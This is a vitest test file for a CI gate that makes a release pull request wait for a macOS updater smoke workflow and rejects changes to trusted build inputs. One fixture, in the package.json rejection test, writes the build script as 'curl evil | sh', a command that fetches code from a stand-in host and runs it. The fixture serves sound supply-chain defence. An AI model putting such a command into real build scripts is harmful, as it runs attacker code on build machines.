import { readFileSync } from "node:fs";
import path from "node:path";
import { type Mock, describe, expect, it, vi } from "vitest";
import {
  assertSmokeWorkflowUnmodified,
  evaluateSmokeRun,
  findMatchingSmokeRuns,
  smokeRunTitle,
  smokeTrustedPaths,
  waitForMacosSmoke,
} from "../scripts/wait-for-release-pr-macos-smoke.mjs";

const successfulRun = {
  id: 123,
  event: "pull_request",
  head_sha: "release-sha",
  head_branch: "release/2026.11.0",
  display_title:
    "macOS updater bundle smoke | PR #42 | head release-sha | base base-sha",
  status: "completed",
  conclusion: "success",
  html_url: "https://github.com/owner/repo/actions/runs/123",
  created_at: "2026-11-02T00:00:00Z",
  run_number: 1,
};

const successfulJobs = [
  {
    name: "Build x86_64-apple-darwin",
    status: "completed",
    conclusion: "success",
  },
  {
    name: "Build aarch64-apple-darwin",
    status: "completed",
    conclusion: "success",
  },
];

function response(payload: object): Response {
  return new Response(JSON.stringify(payload), { status: 200 });
}

const trustedRequests = smokeTrustedPaths.length * 2;

const rustPathAttribute =
  /#\[[^\]]*?\bpath\s*=\s*r?(?<hashes>#*)"(?<modulePath>[^"]+)"\k<hashes>/g;
const rustUnsupportedInclude = /\binclude(?:_bytes|_str)?!\s*\(/;
/** Script paths named in build inputs; the extension is required so trailing dots are not captured. */
const scriptReference = /scripts\/[\w./-]*[\w-]\.\w+/g;
/** Relative module specifiers from `from`, `import(`, bare `import "x"`, and `require(`. */
const relativeImport =
  /(?:\bfrom\s+|\bimport\s*\(\s*|\bimport\s+|\brequire\(\s*)["'](\.{1,2}\/[^"']+)["']/g;
const rustModuleDeclaration =
  /^\s*(?:#\[[^\]]*\]\s*)*(?:pub(?:\s*\([^)]*\))?\s+)?mod\s+\w+\s*;/;

/**
 * True when a Rust file declares a `mod x;` the closure cannot resolve: neither
 * the declaration line nor the line above it carries a `#[path]` attribute.
 */
function hasUnpathedModule(source: string): boolean {
  const lines = source.split("\n");
  return lines.some((line, index) => {
    if (!rustModuleDeclaration.test(line)) return false;
    const previous = index > 0 ? lines[index - 1] : "";
    return !/#\[[^\]]*path\s*=/.test(`${previous}\n${line}`);
  });
}

/** Contents-API body for a JSON file; the sha changes with the content, as it does in git. */
function encodedJson(value: object): object {
  const content = JSON.stringify(value);
  return {
    sha: `sha-${content}`,
    encoding: "base64",
    content: Buffer.from(content).toString("base64"),
  };
}

/** Answers every trusted-path lookup in order, using `changes` for paths whose base and head differ. */
function trustedContentsFetch(
  changes: Record<string, [object | null, object | null]>,
): Mock<typeof fetch> {
  const fetchImpl = vi.fn<typeof fetch>();
  for (const path of smokeTrustedPaths) {
    const [base, head] = changes[path] ?? [
      { sha: `same-${path}` },
      { sha: `same-${path}` },
    ];
    fetchImpl
      .mockResolvedValueOnce(contentsResponse(base))
      .mockResolvedValueOnce(contentsResponse(head));
  }
  return fetchImpl;
}

/** A `null` payload models a path that does not exist at that ref. */
function contentsResponse(payload: object | null): Response {
  if (payload === null) {
    return new Response('{"message":"Not Found"}', { status: 404 });
  }
  return response(payload);
}

/** Queues the trusted-input SHA lookups (base and head for each trusted path) that run before polling. */
function queueTrustedInputs(fetchImpl: Mock<typeof fetch>): Mock<typeof fetch> {
  for (let index = 0; index < trustedRequests; index += 1) {
    fetchImpl.mockResolvedValueOnce(response({ sha: "workflow-sha" }));
  }
  return fetchImpl;
}

describe("release PR macOS updater smoke gate", () => {
  it("starts the smoke workflow for every input the gate trusts", () => {
    const workflow = readFileSync(
      new URL("../.github/workflows/macos-updater-bundle-smoke.yml", import.meta.url),
      "utf8",
    );
    const pathsBlock = workflow.match(/^ {4}paths:\n((?: {6}- .+\n)+)/m);
    expect(pathsBlock).not.toBeNull();
    const filterPaths = [...pathsBlock![1].matchAll(/^ {6}- (.+)$/gm)].map((match) =>
      match[1].trim(),
    );
    const missing = smokeTrustedPaths.filter((file) => !filterPaths.includes(file));
    expect(missing).toEqual([]);
  });

  it("keeps the run title format in sync with the smoke workflow run-name", () => {
    const workflow = readFileSync(
      new URL("../.github/workflows/macos-updater-bundle-smoke.yml", import.meta.url),
      "utf8",
    );
    const template = workflow.match(
      /format\('macOS updater bundle smoke \| PR #\{0\} \| head \{1\} \| base \{2\}'/,
    );
    expect(template).not.toBeNull();

    const args = workflow.match(
      /format\('macOS updater bundle smoke[^']*',\s*([^)]*)\)/,
    );
    expect(args?.[1]?.split(",").map((arg) => arg.trim())).toEqual([
      "github.event.pull_request.number",
      "github.event.pull_request.head.sha",
      "github.event.pull_request.base.sha",
    ]);

    const fromWorkflow = template?.[0]
      .replace("format('", "")
      .replace(/'$/, "")
      .replace("{0}", "42")
      .replace("{1}", "release-sha")
      .replace("{2}", "base-sha");
    expect(fromWorkflow).toBe(smokeRunTitle(42, "release-sha", "base-sha"));
  });

  it("matches the workflow run to the exact PR, head, branch, and base", async () => {
    const fetchImpl = vi.fn<typeof fetch>().mockResolvedValue(
      response({
        workflow_runs: [
          successfulRun,
          { ...successfulRun, id: 122, head_sha: "old-sha" },
          {
            ...successfulRun,
            id: 121,
            display_title:
              "macOS updater bundle smoke | PR #41 | head release-sha | base base-sha",
          },
          {
            ...successfulRun,
            id: 120,
            display_title:
              "macOS updater bundle smoke | PR #42 | head release-sha | base old-base",
          },
        ],
      }),
    );

    const runs = await findMatchingSmokeRuns({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
    });

    expect(runs).toEqual([successfulRun]);
    expect(fetchImpl.mock.calls[0][0]).toContain(
      "head_sha=release-sha&event=pull_request",
    );
  });

  it("ignores skipped runs created by title or body edits", async () => {
    const fetchImpl = vi.fn<typeof fetch>().mockResolvedValue(
      response({
        workflow_runs: [
          { ...successfulRun, id: 130, conclusion: "skipped", run_number: 2 },
          successfulRun,
        ],
      }),
    );

    const runs = await findMatchingSmokeRuns({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
    });

    expect(runs).toEqual([successfulRun]);
  });

  it("rejects a smoke workflow modified by the pull request", async () => {
    const fetchImpl = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(response({ sha: "base-workflow-sha" }))
      .mockResolvedValueOnce(response({ sha: "changed-workflow-sha" }));

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow(
      ".github/workflows/macos-updater-bundle-smoke.yml differs from the PR base",
    );
  });

  it("allows a release PR that changes only the version in package.json and tauri.conf.json", async () => {
    const changes: Record<string, [object | null, object | null]> = {
      "package.json": [
        encodedJson({ name: "epikrise", version: "2026.10.2" }),
        encodedJson({ name: "epikrise", version: "2026.11.0" }),
      ],
      "src-tauri/tauri.conf.json": [
        encodedJson({ productName: "Epikrise", version: "2026.10.2" }),
        encodedJson({ productName: "Epikrise", version: "2026.11.0" }),
      ],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects a package.json change beyond the version", async () => {
    const changes: Record<string, [object | null, object | null]> = {
      "package.json": [
        encodedJson({ name: "epikrise", version: "2026.10.2", scripts: {} }),
        encodedJson({
          name: "epikrise",
          version: "2026.11.0",
          scripts: { build: "curl evil | sh" },
        }),
      ],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).rejects.toThrow("package.json differs from the PR base");
  });

  it("fails closed when a required smoke input cannot be read at either ref", async () => {
    const fetchImpl = trustedContentsFetch({
      ".github/workflows/macos-updater-bundle-smoke.yml": [null, null],
    });

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow(/cannot verify/);
  });

  it("allows an optional build config that is absent at both base and head", async () => {
    const changes = { ".npmrc": [null, null] as [null, null] };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects a pull request that adds a Cargo config the build reads", async () => {
    const changes = {
      ".cargo/config.toml": [null, { sha: "head-cargo", content: "" }] as [
        null,
        object,
      ],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).rejects.toThrow(".cargo/config.toml differs from the PR base");
  });

  it("rejects a pull request that deletes a trusted build module", async () => {
    const changes = {
      "src-tauri/src/windows_updater_features.rs": [{ sha: "base-features" }, null] as [
        object,
        null,
      ],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).rejects.toThrow(
      "src-tauri/src/windows_updater_features.rs differs from the PR base",
    );
  });

  it("rejects a trusted build script modified by the pull request", async () => {
    const fetchImpl = vi.fn<typeof fetch>();
    const changedIndex = smokeTrustedPaths.indexOf("scripts/prepare-ocr.sh");
    for (let index = 0; index < smokeTrustedPaths.length; index += 1) {
      const changed = index === changedIndex;
      fetchImpl
        .mockResolvedValueOnce(response({ sha: `base-${index}` }))
        .mockResolvedValueOnce(
          response({ sha: changed ? "changed-script-sha" : `base-${index}` }),
        );
    }

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow("scripts/prepare-ocr.sh differs from the PR base");
    expect(fetchImpl).toHaveBeenCalledTimes(
      (smokeTrustedPaths.indexOf("scripts/prepare-ocr.sh") + 1) * 2,
    );
  });

  it("passes only when both required smoke jobs succeed", () => {
    expect(evaluateSmokeRun(successfulRun, successfulJobs).state).toBe("passed");
    expect(
      evaluateSmokeRun(
        { ...successfulRun, status: "in_progress", conclusion: null },
        successfulJobs.slice(0, 1),
      ).state,
    ).toBe("pending");
  });

  it("fails when a required smoke job fails", () => {
    const jobs = [successfulJobs[0], { ...successfulJobs[1], conclusion: "failure" }];

    expect(evaluateSmokeRun(successfulRun, jobs)).toMatchObject({
      state: "failed",
      message: expect.stringContaining("Build aarch64-apple-darwin"),
    });
  });

  it("fails clearly when no matching smoke run appears before the deadline", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      response({ workflow_runs: [] }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 1_000,
        maxWaitMs: 0,
      }),
    ).rejects.toThrow("no matching smoke workflow run has appeared");
  });

  it("retries transient API errors before continuing to poll", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(new Response("temporary failure", { status: 503 }))
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));
    let elapsedMs = 0;

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => elapsedMs,
        sleep: async (duration) => {
          elapsedMs += duration;
        },
        maxWaitMs: 5_000,
      }),
    ).resolves.toBeUndefined();
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
    expect(elapsedMs).toBe(1_000);
  });

  it("fails promptly for permanent API permission errors", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      new Response('{"message":"Resource not accessible by integration"}', {
        status: 403,
      }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        maxWaitMs: 5_000,
      }),
    ).rejects.toThrow("GitHub Actions API request failed (403)");
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 1);
  });

  it("retries network failures reported by fetch", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockRejectedValueOnce(
        new TypeError("fetch failed", { cause: new Error("ECONNRESET") }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));
    let elapsedMs = 0;

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => elapsedMs,
        sleep: async (duration) => {
          elapsedMs += duration;
        },
        maxWaitMs: 5_000,
      }),
    ).resolves.toBeUndefined();
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
  });

  it("fails immediately on programming errors thrown as TypeError", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockRejectedValueOnce(
      new TypeError("Cannot read properties of undefined"),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        maxWaitMs: 5_000,
      }),
    ).rejects.toThrow("Cannot read properties of undefined");
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 1);
  });

  it("honors Retry-After when GitHub asks the gate to back off", async () => {
    const sleeps: number[] = [];
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        new Response("slow down", {
          status: 429,
          headers: { "Retry-After": "7" },
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([7_000]);
  });

  it("retries a rate-limited 403 with the fallback backoff", async () => {
    const sleeps: number[] = [];
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        new Response("API rate limit exceeded", {
          status: 403,
          headers: { "x-ratelimit-remaining": "0" },
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([1_000]);
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
  });

  it("ignores x-ratelimit-reset on a server error and uses the fallback backoff", async () => {
    const sleeps: number[] = [];
    const resetInFortyFiveMinutes = Math.floor(Date.now() / 1000) + 2_700;
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        new Response("bad gateway", {
          status: 502,
          headers: { "x-ratelimit-reset": String(resetInFortyFiveMinutes) },
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([1_000]);
  });

  it("retries request timeouts reported as AbortError or TimeoutError", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockRejectedValueOnce(
        Object.assign(new Error("The operation was aborted"), {
          name: "AbortError",
        }),
      )
      .mockRejectedValueOnce(
        Object.assign(new Error("The operation timed out"), {
          name: "TimeoutError",
        }),
      )
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));
    const sleeps: number[] = [];

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
    });
    expect(sleeps).toEqual([1_000, 2_000]);
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 4);
  });

  it("times out with the transient cause when retries exhaust the deadline", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      new Response("unavailable", { status: 503 }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 1_000,
        maxWaitMs: 0,
      }),
    ).rejects.toThrow(
      "Timed out waiting for macOS updater bundle smoke results on release/2026.11.0 at release-sha after a transient GitHub API failure",
    );
  });

  it("names a base mismatch when the smoke run was built for an older base", async () => {
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>()).mockResolvedValueOnce(
      response({
        workflow_runs: [
          {
            ...successfulRun,
            display_title:
              "macOS updater bundle smoke | PR #42 | head release-sha | base old-base",
          },
        ],
      }),
    );

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 1_000,
        maxWaitMs: 0,
      }),
    ).rejects.toThrow("created for a different base");
  });

  it("keeps polling a pending run until both jobs pass", async () => {
    const sleeps: number[] = [];
    const pendingJobs = successfulJobs.map((job) => ({
      ...job,
      status: "in_progress",
      conclusion: null,
    }));
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        response({
          workflow_runs: [
            { ...successfulRun, status: "in_progress", conclusion: null },
          ],
        }),
      )
      .mockResolvedValueOnce(response({ jobs: pendingJobs }))
      .mockResolvedValueOnce(response({ workflow_runs: [successfulRun] }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await waitForMacosSmoke({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
      now: () => 0,
      sleep: async (duration) => {
        sleeps.push(duration);
      },
      maxWaitMs: 60_000,
      intervalMs: 30_000,
    });
    expect(sleeps).toEqual([30_000]);
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 4);
  });

  it("skips a newer successful run whose required jobs were all skipped", async () => {
    const skippedJobs = successfulJobs.map((job) => ({
      ...job,
      conclusion: "skipped",
    }));
    const fetchImpl = queueTrustedInputs(vi.fn<typeof fetch>())
      .mockResolvedValueOnce(
        response({
          workflow_runs: [{ ...successfulRun, id: 130, run_number: 2 }, successfulRun],
        }),
      )
      .mockResolvedValueOnce(response({ jobs: skippedJobs }))
      .mockResolvedValueOnce(response({ jobs: successfulJobs }));

    await expect(
      waitForMacosSmoke({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        pullRequestNumber: 42,
        headSha: "release-sha",
        headRef: "release/2026.11.0",
        baseSha: "base-sha",
        token: "test-token",
        fetchImpl,
        now: () => 0,
        sleep: async () => {
          throw new Error("should not sleep");
        },
        maxWaitMs: 60_000,
        intervalMs: 30_000,
      }),
    ).resolves.toBeUndefined();
    expect(fetchImpl).toHaveBeenCalledTimes(trustedRequests + 3);
  });

  it("trusts every script and Rust module reachable from the trusted build inputs", () => {
    const repoRoot = new URL("../", import.meta.url);
    const reached = new Set<string>();
    const unsupportedRust: string[] = [];
    const pending = [
      ".github/workflows/macos-updater-bundle-smoke.yml",
      "src-tauri/build.rs",
      "src-tauri/tauri.conf.json",
      "src-tauri/tauri.release.conf.json",
      "vite.config.js",
      "svelte.config.js",
      "package.json",
    ];

    /**
     * Only the package.json scripts the smoke job runs (`pnpm install` runs
     * `prepare`, `pnpm build` runs `build`) are followed; the rest are not
     * executed by this gate.
     */
    function inputText(file: string): string {
      const text = readFileSync(new URL(file, repoRoot), "utf8");
      if (file !== "package.json") return text;
      const { scripts } = JSON.parse(text) as Record<string, Record<string, string>>;
      return [scripts.build, scripts.prepare].join("\n");
    }

    while (pending.length > 0) {
      const current = pending.pop() as string;
      if (reached.has(current)) {
        continue;
      }
      reached.add(current);
      const contents = inputText(current);
      if (current.endsWith(".rs")) {
        if (rustUnsupportedInclude.test(contents) || hasUnpathedModule(contents)) {
          unsupportedRust.push(current);
        }
      }
      for (const [reference] of contents.matchAll(scriptReference)) {
        pending.push(reference);
      }
      for (const match of contents.matchAll(rustPathAttribute)) {
        pending.push(
          path.posix.join(path.posix.dirname(current), match.groups?.modulePath ?? ""),
        );
      }
      for (const [, specifier] of contents.matchAll(relativeImport)) {
        pending.push(path.posix.join(path.posix.dirname(current), specifier));
      }
    }

    expect(reached).toContain("svelte.config.js");
    expect(unsupportedRust).toEqual([]);
    const untrusted = [...reached].filter((file) => !smokeTrustedPaths.includes(file));
    expect(untrusted).toEqual([]);
  });

  it("follows every #[path] spelling and flags module forms it cannot resolve", () => {
    const spellings = [
      '#[path = "a.rs"]',
      '#[path="a.rs"]',
      '#[path = r"a.rs"]',
      '#[cfg_attr(unix, path = "a.rs")]',
      '#[cfg_attr(all(unix, not(target_os = "linux")), path = "a.rs")]',
      '#[path = r#"a.rs"#]',
      '#[cfg_attr(all(unix, not(windows)), path = r#"a.rs"#)]',
    ];
    for (const spelling of spellings) {
      const matches = [...spelling.matchAll(rustPathAttribute)].map(
        (match) => match.groups?.modulePath,
      );
      expect(matches).toEqual(["a.rs"]);
    }

    expect(hasUnpathedModule('#[path = "a.rs"]\nmod a;\n')).toBe(false);
    expect(hasUnpathedModule("mod helpers;\n")).toBe(true);
    expect(hasUnpathedModule("pub(crate) mod helpers;\n")).toBe(true);
    expect(hasUnpathedModule("pub(super) mod helpers;\n")).toBe(true);
    expect(hasUnpathedModule("#[cfg(test)] mod tests;\n")).toBe(true);
    expect(hasUnpathedModule('#[path = "a.rs"]\npub(crate) mod a;\n')).toBe(false);
    expect(rustUnsupportedInclude.test('include!("gen.rs");')).toBe(true);
    expect(rustUnsupportedInclude.test('include_str!("data.txt")')).toBe(true);
  });

  it("follows side-effect imports, require calls, and any script extension", () => {
    const source = [
      'import "./setup.mjs";',
      'import { x } from "./a.mjs";',
      'const b = require("./b.cjs");',
      'await import("./c.js");',
      'run("scripts/tool.ps1"); run("scripts/build.sh.");',
    ].join("\n");
    const imports = [...source.matchAll(relativeImport)].map((match) => match[1]);
    expect(imports).toEqual(["./setup.mjs", "./a.mjs", "./b.cjs", "./c.js"]);
    const scripts = [...source.matchAll(scriptReference)].map((match) => match[0]);
    expect(scripts).toEqual(["scripts/tool.ps1", "scripts/build.sh"]);
  });

  it("trusts the package-manager and Cargo config files the build reads", () => {
    for (const configFile of [
      ".npmrc",
      ".pnpmfile.cjs",
      ".cargo/config",
      ".cargo/config.toml",
      "src-tauri/.cargo/config.toml",
      "rust-toolchain.toml",
      "src-tauri/rust-toolchain.toml",
    ]) {
      expect(smokeTrustedPaths).toContain(configFile);
    }
  });
});
